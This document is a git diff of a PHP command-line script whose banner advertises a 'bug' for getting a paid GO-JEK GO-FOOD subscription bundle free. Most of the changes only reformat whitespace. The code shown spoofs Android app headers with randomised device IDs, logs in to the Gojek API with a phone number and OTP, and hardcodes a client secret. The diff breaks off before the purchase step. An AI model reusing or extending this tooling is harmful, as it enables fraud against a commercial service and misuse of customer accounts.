@@ -1,16 +1,17 @@
 <?php
 error_reporting(0);
 require 'function.php';
+
 echo "[i] BUG GO-JEK BUY BUNDLE 'Paket langganan GO-FOOD hemat Rp430rb' FREE by RaP\n\n";
-// Input pin gopay
-echo '[?] Your key? ';
+echo '[?] Your key? ';  // Input pin gopay
 $key = trim(fgets(STDIN));
+
 if ($key == 'trial') {
     echo '[?] Phone? (62xxx atau 1xxx) ';
-    $phone = trim(fgets(STDIN));
-    $bearer = "";
-    $useruuid = "";
-    $uniqueid = rand(1000, 9999).rand(100, 999).'e'.rand(10, 99).'ff'.rand(100, 999).'b';
+    $phone        = trim(fgets(STDIN));
+    $bearer       = "";
+    $useruuid     = "";
+    $uniqueid     = rand(1000, 9999).rand(100, 999).'e'.rand(10, 99).'ff'.rand(100, 999).'b';
     $header_login = array(
         'X-AppVersion: 3.22.1',
         'X-UniqueId: '.$uniqueid,
@@ -32,20 +33,23 @@ if ($key == 'trial') {
         'Connection: Keep-Alive',
         'User-Agent: okhttp/3.12.1'
     );
-    $deviceId = rand(100, 999).'b6d3c-'.rand(1000, 9999).'-'.rand(1000, 9999).'-9fb7-b1'.rand(10000, 99999).'e4c15';
+
+    $deviceId         = rand(100, 999).'b6d3c-'.rand(1000, 9999).'-'.rand(1000, 9999).'-9fb7-b1'.rand(10000, 99999).'e4c15';
     $login_with_phone = request('https://api.gojekapi.com/v4/customers/login_with_phone', '{"phone":"+'.$phone.'"}', null, $header_login);
+
     if (preg_match('/Nomor HP ini tidak valid/', $login_with_phone[1])) {
         $regis = false;
         echo "[i] Response: +62".$phone." [\e[0;0;42mNomor belum terdaftar\e[0m]\n";
     } else if (preg_match('/Kode verifikasi sudah dikirim/', $login_with_phone[1])) {
-        $regis = false;
+        $regis     = false;
         $otp_token = json_decode($login_with_phone[1])->data->login_token;
         echo "[i] ".json_decode($login_with_phone[1])->data->message."\n[i] Kode OTP? ";
-        $otp = trim(fgets(STDIN));
-        $verify = request('https://api.gojekapi.com/v4/customers/login/verify', '{"client_name":"gojek:cons:android","client_secret":"83415d06-ec4e-11e6-a41b-6c40088ab51e","data":{"otp":"'.$otp.'","otp_token":"'.$otp_token.'"},"grant_type":"otp","scopes":"gojek:customer:transaction gojek:customer:readonly"}', null, $header_login);
+        $otp       = trim(fgets(STDIN));
+        $verify    = request('https://api.gojekapi.com/v4/customers/login/verify', '{"client_name":"gojek:cons:android","client_secret":"83415d06-ec4e-11e6-a41b-6c40088ab51e","data":{"otp":"'.$otp.'","otp_token":"'.$otp_token.'"},"grant_type":"otp","scopes":"gojek:customer:transaction gojek:customer:readonly"}', null, $header_login);
+
         if (preg_match('/access_token/', $verify[1])) {
             $bearer = json_decode($verify[1])->data->access_token;
-            $uuid = json_decode($verify[1])->data->customer->id;
+            $uuid   = json_decode($verify[1])->data->customer->id;
             echo "[i] Buy Paket langganan GO-FOOD hemat Rp430rb; 20 Voucher GO-FOOD, masing-masing diskon 25rb\n";
             $header_login = array(
                 'X-AppVersion: 3.22.1',
